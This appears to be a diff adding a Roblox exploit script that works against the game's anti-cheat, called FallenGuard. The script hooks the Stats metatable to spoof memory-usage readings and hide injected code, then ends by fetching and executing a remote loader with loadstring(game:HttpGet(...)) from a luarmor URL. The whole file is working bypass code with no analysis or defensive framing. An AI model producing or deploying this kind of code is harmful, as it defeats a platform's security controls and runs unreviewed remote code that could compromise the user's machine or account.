@@ -1,0 +1,45 @@
+getgenv()['game'] = cloneref(game);
+getgenv()['workspace'] = cloneref(workspace);
+local stats = game:GetService('Stats');
+local players = game:GetService('Players');
+local runservice = game:GetService('RunService');
+
+local localplayer = players.LocalPlayer;
+local playerscripts = localplayer.PlayerScripts;
+local fallenguard = playerscripts.FallenGuard;
+
+local run = [[
+
+    getgenv()['game'] = cloneref(game);
+    getgenv()['workspace'] = cloneref(workspace);
+
+    local math_abs = math.abs;
+    local math_random = math.random;
+
+    local stats = game:GetService('Stats');
+    local players = game:GetService('Players');
+    local runservice = game:GetService('RunService');
+
+    local localplayer = players.LocalPlayer;
+    local playerscripts = localplayer.PlayerScripts;
+    local fallenguard = playerscripts.FallenGuard;
+
+    local memusage = stats:GetTotalMemoryUsageMb();
+
+    local mt = getrawmetatable(stats);
+    local oldnamecall = mt.__namecall;
+    setreadonly(mt, false);
+    mt.__namecall = function(self, ...)
+        local method = getnamecallmethod();
+        if (method == 'GetTotalMemoryUsageMb') then
+            return memusage + math_random(-40, 40) + math_random();
+        end
+        return oldnamecall(self, ...);
+    end
+    setreadonly(mt, true);
+
+]]
+run_on_actor(fallenguard, run);
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3c7f0b8e4882c14868874b72c70e8340.lua"))()
+
